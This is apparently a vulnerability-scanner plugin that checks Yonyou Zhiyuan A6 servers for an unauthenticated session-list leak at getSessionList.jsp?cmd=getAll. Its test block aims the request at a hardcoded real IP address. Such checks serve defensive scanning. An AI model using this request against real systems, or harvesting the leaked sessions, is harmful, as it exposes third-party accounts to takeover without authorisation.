#!/usr/bin/env python
# -*- coding: utf-8 -*
# 用友致远A6协同系统账号密码泄露
import re

def assign(service, arg):
    if service == 'yongyou_zhiyuan_a6':
        return True, arg
        
def audit(arg):
    reg = re.compile(r'[a-fA-F0-9]{32,32}')
    payload = "yyoa/ext/https/getSessionList.jsp?cmd=getAll"
    code,_,res,_,_ = curl.curl2(arg+payload)
    m = reg.findall(res)
    if m and code == 200:
        security_warning(arg+payload)
if __name__ == '__main__':
    from dummy import *
    audit(assign('yongyou_zhiyuan_a6','http://222.175.187.147:8081/')[1])